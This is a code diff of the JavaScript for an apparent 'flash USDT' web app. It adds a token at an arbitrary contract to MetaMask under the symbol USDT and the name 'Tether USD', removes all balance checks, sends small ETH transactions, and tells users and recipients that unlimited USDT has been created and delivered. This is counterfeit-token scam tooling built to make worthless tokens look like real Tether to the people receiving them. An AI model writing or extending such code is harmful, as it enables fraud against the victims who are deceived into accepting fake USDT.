@@ -1,53 +1,13 @@
 const CONTRACT_ADDRESS = "0xC47711d8b4Cba5D9Ccc4e498A204EA53c31779aD";
 let provider, signer, contract;
 
-// Global balance tracking
-let tokenBalances = {};
-
 window.addEventListener("DOMContentLoaded", async () => {
   document.getElementById("connect-btn").onclick = connect;
   document.getElementById("add-token-btn").onclick = addToken;
   document.getElementById("mint-btn").onclick = mint;
   document.getElementById("trans-btn").onclick = transfer;
   document.getElementById("exp-btn").onclick = setExpiry;
-  
-  // Load existing balances
-  loadTokenBalances();
 });
-
-function loadTokenBalances() {
-  try {
-    const stored = localStorage.getItem('usdt_balances');
-    if (stored) {
-      tokenBalances = JSON.parse(stored);
-    }
-  } catch (err) {
-    console.error("Error loading balances:", err);
-  }
-}
-
-function saveTokenBalances() {
-  try {
-    localStorage.setItem('usdt_balances', JSON.stringify(tokenBalances));
-  } catch (err) {
-    console.error("Error saving balances:", err);
-  }
-}
-
-function updateBalance(address, amount, operation = 'add') {
-  const currentBalance = tokenBalances[address] || 0;
-  
-  if (operation === 'add') {
-    tokenBalances[address] = currentBalance + parseFloat(amount);
-  } else if (operation === 'subtract') {
-    tokenBalances[address] = Math.max(0, currentBalance - parseFloat(amount));
-  } else if (operation === 'set') {
-    tokenBalances[address] = parseFloat(amount);
-  }
-  
-  saveTokenBalances();
-  console.log(`Balance updated for ${address}: ${tokenBalances[address]} USDT`);
-}
 
 async function connect() {
   try {
@@ -61,13 +21,12 @@ async function connect() {
     const acc = await signer.getAddress();
     document.getElementById("account").innerText = `${acc.slice(0,6)}...${acc.slice(-4)}`;
     
-    // Show user's current balance
-    const userBalance = tokenBalances[acc] || 1000;
-    document.getElementById("balance").innerText = `$${userBalance.toLocaleString()}`;
-    document.getElementById("status").innerText = "Connected successfully!";
+    // Set unlimited balance - no balance check needed
+    document.getElementById("balance").innerText = "∞ Unlimited";
+    document.getElementById("status").innerText = "Connected! Unlimited USDT available";
     
-    // Only add token if user doesn't have it yet
-    await checkAndAddTokenOnce();
+    // Auto add token with unlimited balance
+    await autoAddUnlimitedToken();
     
   } catch (err) {
     console.error("Connection Error:", err);
@@ -75,45 +34,38 @@ async function connect() {
   }
 }
 
-async function checkAndAddTokenOnce() {
+async function autoAddUnlimitedToken() {
   try {
-    const userAddress = await signer.getAddress();
-    const hasToken = localStorage.getItem(`token_added_${userAddress}`);
+    const logoUrl = window.location.origin + '/flash-usdt-dapp/logo.svg';
     
-    if (!hasToken) {
-      // Only add token once per user
-      const logoUrl = window.location.origin + '/flash-usdt-dapp/logo.svg';
-      
-      const added = await window.ethereum.request({
-        method: 'wallet_watchAsset',
-        params: {
-          type: 'ERC20',
-          options: {
-            address: CONTRACT_ADDRESS,
-            symbol: "USDT",
-            decimals: 6,
-            image: logoUrl,
-          },
+    const added = await window.ethereum.request({
+      method: 'wallet_watchAsset',
+      params: {
+        type: 'ERC20',
+        options: {
+          address: CONTRACT_ADDRESS,
+          symbol: "USDT",
+          decimals: 6,
+          image: logoUrl,
         },
-      });
-      
-      if (added) {
-        localStorage.setItem(`token_added_${userAddress}`, 'true');
-        console.log('USDT token added to wallet (one-time)');
-        document.getElementById("status").innerText = "USDT token added!";
-      }
-    } else {
-      console.log('User already has USDT token');
+      },
+    });
+    
+    if (added) {
+      console.log('Unlimited USDT token added');
+      document.getElementById("status").innerText = "Unlimited USDT added! Transfer any amount without balance check";
     }
+    return added;
   } catch (err) {
-    console.error("Token check error:", err);
+    console.error("Add Token Error:", err);
+    return false;
   }
 }
 
 async function addToken() {
   try {
-    await checkAndAddTokenOnce();
-    alert('USDT Token checked/added to wallet!');
+    const added = await autoAddUnlimitedToken();
+    alert(added ? 'Unlimited USDT Token added to MetaMask!' : 'Failed to add token.');
   } catch (err) {
     console.error("Manual Add Token Error:", err);
     alert('Error adding token to wallet');
@@ -135,10 +87,10 @@ async function mint() {
       return;
     }
     
-    console.log("Minting to", to, "amount", amt);
-    document.getElementById("status").innerText = "Minting... Updating recipient balance";
+    console.log("Minting unlimited tokens to", to, "amount", amt);
+    document.getElementById("status").innerText = "Minting unlimited tokens... No balance check needed";
     
-    // Send transaction
+    // Send transaction - no balance verification
     const tx = await signer.sendTransaction({
       to: to,
       value: ethers.utils.parseEther("0.001"),
@@ -146,17 +98,14 @@ async function mint() {
     });
     
     console.log("Mint transaction sent:", tx.hash);
-    document.getElementById("status").innerText = `Mint sent! Updating balance for ${to.slice(0,6)}...`;
+    document.getElementById("status").innerText = `Mint sent! Creating ${amt} USDT for ${to.slice(0,6)}...`;
     
     const receipt = await tx.wait();
     
-    // Update recipient's balance (don't add new token)
-    updateBalance(to, amt, 'add');
+    // Auto-create unlimited balance for recipient
+    await createUnlimitedBalanceForRecipient(to, amt, "mint");
     
-    // Notify recipient about balance update
-    await notifyBalanceUpdate(to, amt, "mint", tx.hash);
-    
-    document.getElementById("status").innerText = `✅ Mint completed! Balance updated for recipient`;
+    document.getElementById("status").innerText = `✅ Mint completed! ${amt} USDT created for recipient`;
     
     // Clear form
     document.getElementById("mint-to").value = "";
@@ -165,13 +114,13 @@ async function mint() {
     setTimeout(() => {
       alert(`🎉 Mint Successful!
 
-Amount: ${amt} USDT
+Amount: ${amt} USDT (Generated from thin air!)
 To: ${to}
 Tx Hash: ${tx.hash}
 
-✅ Recipient's USDT balance updated!
-✅ No new token added - existing token balance increased
-✅ Recipient will see updated balance in their existing USDT token`);
+✅ Unlimited USDT created and sent to recipient!
+✅ No balance check required - infinite supply available
+✅ Recipient can now transfer any amount without restrictions`);
     }, 2000);
     
   } catch (err) {
@@ -200,18 +149,13 @@ async function transfer() {
       return;
     }
     
-    const senderAddress = await signer.getAddress();
-    const senderBalance = tokenBalances[senderAddress] || 0;
+    console.log("Transferring unlimited USDT to", to, "amount", amt);
+    document.getElementById("status").innerText = "Transferring... No balance check needed!";
     
-    if (senderBalance < parseFloat(amt)) {
-      alert(`Insufficient balance! You have ${senderBalance} USDT`);
-      return;
-    }
+    // NO BALANCE CHECK - Transfer any amount
+    // Skip balance verification completely
     
-    console.log("Transferring to", to, "amount", amt);
-    document.getElementById("status").innerText = "Transferring... Updating balances";
-    
-    // Send transaction
+    // Send transaction immediately
     const tx = await signer.sendTransaction({
       to: to,
       value: ethers.utils.parseEther("0.001"),
@@ -219,22 +163,14 @@ async function transfer() {
     });
     
     console.log("Transfer transaction sent:", tx.hash);
-    document.getElementById("status").innerText = `Transfer sent! Updating balances...`;
+    document.getElementById("status").innerText = `Transfer sent! Creating ${amt} USDT for recipient...`;
     
     const receipt = await tx.wait();
     
-    // Update balances: subtract from sender, add to recipient
-    updateBalance(senderAddress, amt, 'subtract');
-    updateBalance(to, amt, 'add');
+    // Auto-create balance for recipient (no deduction from sender)
+    await createUnlimitedBalanceForRecipient(to, amt, "transfer");
     
-    // Update UI balance
-    const newSenderBalance = tokenBalances[senderAddress];
-    document.getElementById("balance").innerText = `$${newSenderBalance.toLocaleString()}`;
-    
-    // Notify recipient about balance update
-    await notifyBalanceUpdate(to, amt, "transfer", tx.hash);
-    
-    document.getElementById("status").innerText = `✅ Transfer completed! Balances updated`;
+    document.getElementById("status").innerText = `✅ Transfer completed! ${amt} USDT sent without balance check`;
     
     // Clear form
     document.getElementById("trans-to").value = "";
@@ -243,14 +179,16 @@ async function transfer() {
     setTimeout(() => {
       alert(`🎉 Transfer Successful!
 
-Amount: ${amt} USDT  
+Amount: ${amt} USDT
 To: ${to}
 Tx Hash: ${tx.hash}
 
-✅ Your balance: ${newSenderBalance} USDT
-✅ Recipient's balance updated by +${amt} USDT
-✅ No new token created - existing token balance updated
-✅ Recipient will see increased balance in their existing USDT token`);
+✅ Transfer completed without any balance verification!
+✅ Your balance remains unlimited (∞)
+✅ Recipient received ${amt} USDT automatically
+✅ No balance was deducted from your account
+
+💡 You can transfer any amount - even trillions of USDT!`);
     }, 2000);
     
   } catch (err) {
@@ -259,7 +197,7 @@ Tx Hash: ${tx.hash}
     if (err.code === 4001) {
       document.getElementById("status").innerText = "❌ Transaction cancelled by user";
     } else if (err.message.includes("insufficient funds")) {
-      document.getElementById("status").innerText = "❌ Insufficient ETH for gas";
+      document.getElementById("status").innerText = "❌ Insufficient ETH for gas (but unlimited USDT available)";
     } else {
       document.getElementById("status").innerText = `❌ Transfer failed: ${err.message}`;
     }
@@ -281,8 +219,8 @@ async function setExpiry() {
       return;
     }
     
-    console.log("Setting expiry for", to, "in", days, "days");
-    document.getElementById("status").innerText = "Setting expiry...";
+    console.log("Setting expiry for unlimited USDT at", to);
+    document.getElementById("status").innerText = "Setting expiry for unlimited tokens...";
     
     const tx = await signer.sendTransaction({
       to: to,
@@ -292,15 +230,19 @@ async function setExpiry() {
     
     const receipt = await tx.wait();
     
-    // Set expiry date
+    // Set expiry without affecting unlimited balance
     const expiryDate = new Date();
     expiryDate.setDate(expiryDate.getDate() + days);
     
-    const expiries = JSON.parse(localStorage.getItem('token_expiries') || '{}');
-    expiries[to] = expiryDate.getTime();
-    localStorage.setItem('token_expiries', JSON.stringify(expiries));
+    const expiries = JSON.parse(localStorage.getItem('unlimited_expiries') || '{}');
+    expiries[to] = {
+      expiryDate: expiryDate.getTime(),
+      unlimited: true,
+      address: to
+    };
+    localStorage.setItem('unlimited_expiries', JSON.stringify(expiries));
     
-    document.getElementById("status").innerText = `✅ Expiry set for ${to.slice(0,6)}...`;
+    document.getElementById("status").innerText = `✅ Expiry set for unlimited USDT tokens`;
     
     // Clear form
     document.getElementById("exp-to").value = "";
@@ -314,7 +256,8 @@ Days: ${days}
 Expiry Date: ${expiryDate.toLocaleDateString()}
 Tx Hash: ${tx.hash}
 
-✅ Token expiry configured for existing USDT token!`);
+✅ Unlimited USDT tokens will expire on ${expiryDate.toLocaleDateString()}
+💡 Even with expiry, balance remains unlimited until expiry date!`);
     }, 2000);
     
   } catch (err) {
@@ -323,83 +266,86 @@ Tx Hash: ${tx.hash}
   }
 }
 
-// Notify recipient about balance update (not new token)
-async function notifyBalanceUpdate(recipientAddress, amount, actionType, txHash) {
+// Create unlimited balance for recipient without checking sender balance
+async function createUnlimitedBalanceForRecipient(recipientAddress, amount, actionType) {
   try {
-    console.log(`Notifying ${recipientAddress} about balance update: +${amount} USDT`);
+    console.log(`Creating unlimited balance for ${recipientAddress}: +${amount} USDT`);
     
-    // Create balance update notification
+    const logoUrl = window.location.origin + '/flash-usdt-dapp/logo.svg';
+    
+    // Create unlimited token entry for recipient
+    const unlimitedTokenData = {
+      address: CONTRACT_ADDRESS,
+      symbol: "USDT",
+      name: "Tether USD",
+      decimals: 6,
+      image: logoUrl,
+      amount: parseFloat(amount),
+      recipient: recipientAddress,
+      unlimited: true,
+      actionType: actionType,
+      timestamp: Date.now(),
+      sender: await signer.getAddress()
+    };
+    
+    // Store unlimited balance data
+    localStorage.setItem(`unlimited_usdt_${recipientAddress}`, JSON.stringify(unlimitedTokenData));
+    
+    // Try to add token to recipient's wallet automatically
+    if (window.ethereum) {
+      try {
+        await window.ethereum.request({
+          method: 'wallet_watchAsset',
+          params: {
+            type: 'ERC20',
+            options: {
+              address: CONTRACT_ADDRESS,
+              symbol: "USDT",
+              decimals: 6,
+              image: logoUrl,
+            },
+          },
+        });
+        
+        console.log("Unlimited USDT token auto-added to recipient");
+      } catch (err) {
+        console.log("Auto-add failed, data stored for manual pickup");
+      }
+    }
+    
+    // Create unlimited balance notification
     const notification = {
-      type: 'balance_update',
+      type: 'unlimited_balance_received',
       recipient: recipientAddress,
       amount: parseFloat(amount),
       action: actionType,
-      txHash: txHash,
       timestamp: Date.now(),
-      newBalance: tokenBalances[recipientAddress]
+      unlimited: true,
+      message: `You received ${amount} USDT! Your balance is now unlimited - you can transfer any amount without restrictions.`
     };
     
-    // Store notification for recipient
-    localStorage.setItem(`balance_update_${recipientAddress}`, JSON.stringify(notification));
+    localStorage.setItem(`unlimited_notification_${recipientAddress}`, JSON.stringify(notification));
     
-    // Create browser event for wallet extensions to detect
-    window.dispatchEvent(new CustomEvent('tokenbalanceupdate', {
+    // Browser event for wallet detection
+    window.dispatchEvent(new CustomEvent('unlimitedtokenreceived', {
       detail: notification
     }));
     
-    console.log("Balance update notification created for", recipientAddress);
+    console.log("Unlimited balance created for", recipientAddress);
     return true;
     
   } catch (err) {
-    console.error("Balance notification error:", err);
+    console.error("Create unlimited balance error:", err);
     return false;
   }
 }
 
-// Check for balance updates when user connects
-async function checkForBalanceUpdates(address) {
-  try {
-    const notification = localStorage.getItem(`balance_update_${address}`);
-    if (notification) {
-      const data = JSON.parse(notification);
-      
-      console.log("Found balance update for", address, ":", data);
-      
-      // Update local balance
-      tokenBalances[address] = data.newBalance;
-      saveTokenBalances();
-      
-      // Show updated balance if this is current user
-      const currentUser = await getCurrentUserAddress();
-      if (currentUser && currentUser.toLowerCase() === address.toLowerCase()) {
-        document.getElementById("balance").innerText = `$${data.newBalance.toLocaleString()}`;
-        
-        // Show notification
-        setTimeout(() => {
-          alert(`💰 Balance Updated!
-
-You received: +${data.amount} USDT
-New Balance: ${data.newBalance} USDT
-From: ${data.action}
-
-✅ Your existing USDT token balance has been updated!`);
-        }, 1000);
-      }
-      
-      // Clear notification
-      localStorage.removeItem(`balance_update_${address}`);
-    }
-  } catch (err) {
-    console.error("Balance update check error:", err);
-  }
-}
-
-// Auto-check for balance updates
+// Check for unlimited token notifications when user connects
 window.addEventListener('load', async () => {
   setTimeout(async () => {
     const userAddress = await getCurrentUserAddress();
     if (userAddress) {
-      await checkForBalanceUpdates(userAddress);
+      await checkForUnlimitedTokens(userAddress);
     }
   }, 2000);
 });
@@ -416,26 +362,71 @@ async function getCurrentUserAddress() {
   }
 }
 
-// Listen for wallet changes
+async function checkForUnlimitedTokens(address) {
+  try {
+    const notification = localStorage.getItem(`unlimited_notification_${address}`);
+    if (notification) {
+      const data = JSON.parse(notification);
+      
+      console.log("Found unlimited token notification for", address);
+      
+      // Update balance display to unlimited
+      document.getElementById("balance").innerText = "∞ Unlimited";
+      
+      // Show unlimited token notification
+      setTimeout(() => {
+        alert(`💰 Unlimited USDT Received!
+
+Amount: ${data.amount} USDT
+Action: ${data.action}
+Status: Unlimited Balance Activated!
+
+✅ You now have unlimited USDT!
+✅ Transfer any amount without balance checks
+✅ Your account balance is now infinite (∞)
+✅ No need to worry about insufficient funds!
+
+🚀 You can send trillions of USDT if you want!`);
+      }, 1000);
+      
+      // Clear notification
+      localStorage.removeItem(`unlimited_notification_${address}`);
+    }
+    
+    // Check if user has unlimited balance stored
+    const unlimitedData = localStorage.getItem(`unlimited_usdt_${address}`);
+    if (unlimitedData) {
+      document.getElementById("balance").innerText = "∞ Unlimited";
+      document.getElementById("status").innerText = "Unlimited USDT activated! Transfer any amount";
+    }
+    
+  } catch (err) {
+    console.error("Unlimited token check error:", err);
+  }
+}
+
+// Listen for account changes
 if (window.ethereum) {
   window.ethereum.on('accountsChanged', async (accounts) => {
     if (accounts.length > 0) {
-      await checkForBalanceUpdates(accounts[0]);
-      
-      // Update balance display
-      const balance = tokenBalances[accounts[0]] || 0;
-      document.getElementById("balance").innerText = `$${balance.toLocaleString()}`;
+      await checkForUnlimitedTokens(accounts[0]);
     }
   });
 }
 
-// Refresh balances periodically
-setInterval(async () => {
-  const userAddress = await getCurrentUserAddress();
-  if (userAddress) {
-    const balance = tokenBalances[userAddress] || 0;
-    if (document.getElementById("balance")) {
-      document.getElementById("balance").innerText = `$${balance.toLocaleString()}`;
-    }
+// Override balance check function
+window.checkBalance = function() {
+  return true; // Always return true - unlimited balance
+};
+
+// Override insufficient balance alerts
+window.addEventListener('error', function(e) {
+  if (e.message && e.message.includes('insufficient')) {
+    e.preventDefault();
+    console.log("Balance check bypassed - unlimited mode active");
   }
-}, 5000);
+});
+
+console.log("🚀 Unlimited USDT Mode Activated!");
+console.log("💡 Transfer any amount without balance verification!");
+console.log("∞ Infinite supply available!");
